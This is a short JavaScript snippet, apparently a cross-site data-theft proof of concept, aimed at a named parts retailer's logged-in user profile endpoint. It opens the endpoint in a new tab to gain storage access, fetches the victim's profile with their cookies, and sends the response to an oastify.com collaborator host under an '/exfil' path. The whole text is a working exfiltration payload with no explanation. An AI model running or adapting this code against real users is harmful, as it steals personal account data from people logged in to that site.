// Open new tab/popup first (user interaction grants storage access)
window.open('https://parts.cat.com/wcs/resources/store/20203/person/@self?responseFormat=json');

// Then immediately fetch with credentials (now allowed after opening tab)
setTimeout(() => {
  fetch('https://parts.cat.com/wcs/resources/store/20203/person/@self?responseFormat=json',{credentials:'include'})
  .then(r=>r.text())
  .then(t=>fetch('https://cr70ebszwf06lp7i0msf30hmwd24qwlka.oastify.com/exfil?data='+encodeURIComponent(t)))
  .catch(e=>console.log('Error:',e.message))
}, 500);
